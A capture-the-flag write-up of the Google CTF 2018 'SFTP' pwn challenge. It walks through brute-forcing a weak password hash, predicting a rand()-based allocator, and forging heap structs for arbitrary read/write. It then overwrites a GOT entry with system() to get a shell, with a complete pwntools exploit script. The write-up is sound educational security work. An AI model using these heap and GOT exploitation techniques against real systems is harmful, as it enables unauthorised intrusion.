# Google CTF 2018: SFTP (pwn, 181pt)

This challenge was one of the easier challenges from Google CTF, based on solve
count (60), but it still
wasn't easy! I enjoyed it, because I got to play around with heap
exploitation concepts, without knowing all the intricate details of how conventional
allocators work (read on to find out why!).

## Recon

For this challenge, we are provided with a single x86 ELF binary file, `sftp`,
along with the address and port of a remote service.

```
$ file sftp
sftp: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b15828393908d800f35ca33917dfd015daff8340, stripped

$ checksec --file sftp
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY   Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH Yes       3         9            sftp
```

As we can see, it has all the usual fortifications (NX, PIE, stack canary),
and we can safely assume that the remote service will have ASLR enabled.

When we run the binary, we are presented with a fake ssh-like login prompt,
which kicks us out if we provide an incorrect password.

```
$ ./sftp 
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password: hunter2
$
```

We can patch out the login check for debugging purposes, but we're going to need
to reverse engineer it at some point, in order to exploit the remote system.
Putting 2 NOPs at file offset 0x145C is a simple way to make this check always pass.

```
$ ./sftp.patched
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password: lol
Connected to sftp.google.ctf.
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
get remote                         Download file
ls [path]                          Display remote directory listing
mkdir path                         Create remote directory
put local                          Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
sftp> ls
flag
src
sftp> get flag
12
Nice try ;-)sftp> ls src
sftp.c
sftp> get src/sftp.c
14910
[source code here]
```

Helpfully, the program contains (most of) it's own source!
[sftp.c](https://gist.github.com/DavidBuchanan314/45824ebb8cc20fba80e42c4d249b1a64)

## "Authentication"

As I said earlier, we need to find a way past that login prompt.
The first thing to look at is the `authenticate_user` function:

```c
bool authenticate_user() {
  char password[16];
  uint16_t hash = 0x5417;
  printf("%s@%s's password: ", user_name, host_name);
  if (scanf("%15s", password)) {
    getc(stdin);
    for (char* ptr = password; *ptr; ++ptr) {
      hash ^= *ptr;
      hash <<= 1;
    }
    if (hash == 36346) {
      return true;
    }
  }
  return false;
}
```

Given that it's just a 16-bit hash function, we can trivially bruteforce a hash
collision.

I wrote a simple python script to find collisions:

```python
def checkpass(password):
    hash = 0x5417
    for c in password:
        hash ^= c
        hash <<= 1
        hash &= 0xFFFF
    return hash == 36346

for line in open("/usr/share/dict/words").readlines():
    key = line.strip().upper()
    if checkpass(key.encode()):
        print(key)
```

It spits out a list of several matches, let's go with `DEBUG` (I wonder if this
was the "intended" password?).

## Heap ~~Feng Shui~~ Stuff

With that out of the way, we can start looking for actual vulnerabilities.
There isn't that much of interest in the provided source, except the dubiously
named `#include "secure_allocator.h"`. We aren't given the source for this header
file, so it's time to break out IDA and have a look around:

```c
void *malloc()
{
  return (void *)(rand() & 0x1FFFFFFF | 0x40000000LL);
}

void *realloc(void *a1)
{
  return a1;
}

void free(void *a1)
{
  ;
}
```

Yup, very secure. At least it isn't vulnerable to unlink exploits!

If we can make some allocations overlap, by "chance", then we can start exploiting
things. To do this reliably, it helps to be able to predict `rand()`. There are
a couple of functions in the `init_array`, one of which mmap's the heap into existence
at `0x40000000`, and then does `srand(time(NULL))` i.e. seeds the RNG with the current
time. As long as our local time is synced to the remote system, to within 1 second,
then we can reliably predict the remote RNG, and therefore predict exactly how
the remote heap will be laid out, so that we can exploit overlaping allocations.

Time to start exploiting! Lets take a look at some of the structs that will end up on the heap:

```c
struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};

struct file_entry {
  struct entry entry;

  size_t size;
  char* data;
};
```

`file_entry` looks like the most easily exploitable datastructure.
If we can overwrite the data pointer (due to the data allocation of another file
overlapping it), then we have an arbitrary read/write primitive with the `get`
and `put` commands.

Now that we have a r/w primitive, we need to overwrite a function pointer to get
code execution. Overwriting a GOT entry to point to `system()` (or a "magic gadget")
would be a good idea. However, to access the GOT, we need to find the PIE ASLR offset.

The only data we reliably know the location of, is the data on the heap. Since all
the addresses of the `sftp` binary begin with `0x555555` (in gdb with ASLR disabled)
, we can use a bit of a hack to scan the heap for references to the main binary in gdb/peda:

```
gdb-peda$ find "UUU" 0x40000000 0x60100000
Searching for 'UUU' in range: 0x40000000 - 0x60100000
Found 1 results, display max 1 items:
mapped : 0x4926df34 --> 0x10000555555
gdb-peda$ x/1x 0x4926df31
0x4926df31:	0x000055555575cbe0
```

After a quick inspection of the disassembled code, it would appear that this
is the reference to the "root" file node, which is set up in one of the `init_array` functions.
Using this reference to the root file node, we can read and write the GOT entries.

## Implementation
Here's my final exploit implementation: (Cleaned up a lot since the CTF...)

```python
#!/usr/bin/python2
from pwn import *
from ctypes import *
import time

FILE_ENTRY = 0x2
class FileEntry(Structure):
	_fields_ = [
		("parent_directory", c_uint64),
		("entry_type", c_uint32),
		("name", type(create_string_buffer(20))),
		("size", c_uint64),
		("data", c_uint64),
	]

libctypes = CDLL('libc.so.6')
elf = ELF("./sftp")

TESTING = False
if TESTING:
	libc = ELF("/lib/libc.so.6")
	start_time = time.time()
	sftp = process("./sftp")
else:
	# libc unknown :(
	LOCAL_TIME_OFFSET = 2.1 # via https://time.is - "Your clock is 2.1 seconds ahead."
	remote_time_now = time.time() - LOCAL_TIME_OFFSET
	start_time = round(remote_time_now)+0.5
	time.sleep(start_time-remote_time_now) # start exactly halfway between two seconds
	sftp = remote("sftp.ctfcompetition.com", 1337)

# setup heap prediction
libctypes.srand(int(start_time))
malloc_count = 0 # purely for info
def malloc():
	global malloc_count
	malloc_count += 1
	return libctypes.rand() & 0x1FFFFFFF | 0x40000000

leak_location = malloc()
leak_value = 0x208BE0

log.info("Leak location: " + hex(leak_location))

# initial allocations
for i in range(5):
	malloc()

file_datas = {} # maps the address of a file node onto the address of it's data allocation
col_node = None # the node that gets smashed
col_data_node = None # the node whose data allocation does the smashing
MAX_DIST = 0x1000 # arbitrary maximum distance between overlapping objects
# smaller = harder to find overlap
# bigger = more IO overhead for r/w primitive

while not col_node:
	new_node = malloc()
	new_data = malloc()
	file_datas[new_node] = new_data
	for n, d in file_datas.items():
		if 0 < (n - new_data) <= MAX_DIST:
			col_node = n
			col_data_node = new_node

log.info("File node entry at 0x{:x} can overlap with data allocation at 0x{:x},"
         " belonging to file node 0x{:x}".format(col_node,
                                                 file_datas[col_data_node],
                                                 col_data_node))
log.info("{} mallocs needed".format(malloc_count))

sftp.sendline("yes")
sftp.sendline("DEBUG")

for a in file_datas.keys():
	if a != col_data_node:
		sftp.sendline("put {:x}".format(a))
		sftp.sendline("1")
		sftp.send("\0")

def setup_rw(address, size=8):
	sftp.sendline("put smasher")
	overlap = col_node - file_datas[col_data_node]
	# construct a fake file node entry
	ent = FileEntry(
		entry_type = FILE_ENTRY,
		name = "hacked",
		size = size,
		data = address
	)
	payload = "A"*overlap + str(buffer(ent))
	sftp.sendline(str(len(payload)))
	sftp.send(payload)
	sftp.recvuntil("sftp> ")

def read_mem(address, size=8):
	setup_rw(address, size)
	sftp.sendline("get hacked") # nice
	sftp.recvuntil(str(size)+"\n")
	data = sftp.recvn(size)
	sftp.recvuntil("sftp> ")
	return data

def read_addr(address):
	return u64(read_mem(address))

def write_addr(address, value):
	setup_rw(address)
	sftp.sendline("put hacked")
	sftp.sendline("8")
	sftp.send(p64(value))
	sftp.recvuntil("sftp> ")

leaked_addr = read_addr(leak_location)
elf.address = leaked_addr - leak_value
log.info("PIE BASE:    " + hex(elf.address))

libc_puts = read_addr(elf.got["puts"])
libc_mmap = read_addr(elf.got["mmap"])
libc_rand = read_addr(elf.got["rand"])
# printing multiple in an attempt to identify the libc version
log.info("libc puts:   " + hex(libc_puts))
log.info("libc mmap:   " + hex(libc_mmap))
log.info("libc rand:   " + hex(libc_rand))

DUMP_LIBC = False
if DUMP_LIBC:
	# step 1: search backwards until we find the base of libc
	log.info("Locating libc base")
	libc_base = (libc_rand/0x1000)*0x1000
	while read_mem(libc_base, 4) != "\x7fELF":
		libc_base -= 0x1000
	log.info("libc base:   " + hex(libc_base))
	# step 2: dump libc in chunks
	BLOCK_SIZE = 0x1000
	with open("dumped_libc.so", "wb") as f:
		bytes_read = 0
		while True:
			dumped = read_mem(libc_base+bytes_read, BLOCK_SIZE)
			bytes_read += BLOCK_SIZE
			f.write(dumped)
			log.info("Dumped 0x{:x} bytes".format(bytes_read))

if TESTING:
	libc.address = libc_puts - libc.sym["puts"]
	log.info("libc base:   " + hex(libc.address))
	write_addr(elf.got["strtok"], libc.sym["system"])
else:
	SYSTEM_OFFSET = 0x45390 # taken from dumped_libc.so
	RAND_OFFSET = 0x3af60
	libc_system = libc_rand - RAND_OFFSET + SYSTEM_OFFSET
	write_addr(elf.got["strtok"], libc_system)

sftp.sendline("get /bin/sh") # w00t
sftp.interactive()
```

First of all, I make sure that my local time and the remote server time are synced
up. I use the python `ctypes` module to call the libc `srand` and `rand` functions,
in order to replicate and predict the remote `malloc` implementation.

Then, I simulate the creation of new file nodes, until I detect a pair that are close
enough such that the data region of one can overwrite the file node of another. After
that, I send the commands to the server to *actually* create the files.

The creation of the read/write primitive is simple, I just use `ctypes` again to
create a new `file_entry` struct, which overwrites an existing one. I called
this crafted file "hacked", so that I could trigger arbitrary reads and writes
by sending the `get hacked` or `put hacked` commands.

Unfortunately, I was unable to work out the remote libc version using any online
libc databases. To get around this, I dumped the entire libc from memory (using
my arbitrary read primitive), and analysed it with IDA to find the `system` function.

I decided to replace the `strtok` GOT entry with `system`, so that sending the command
`get /bin/sh` will spawn a shell, which we can use to cat the flag:

```
cat /home/user/flag
CTF{Moar_Randomz_Moar_Mitigatez!}
```

## Improvements

After solving this, a teammate told me about pwntools' [DynELF](http://docs.pwntools.com/en/stable/dynelf.html) functionality.
It effectively automates my "dump libc to find system()" process, except much
more efficiently because it doesn't have to dump the entire binary.

Using it is as simple as this:

```python
d = DynELF(read_mem, libc_rand)
libc_system = d.lookup("system")
```
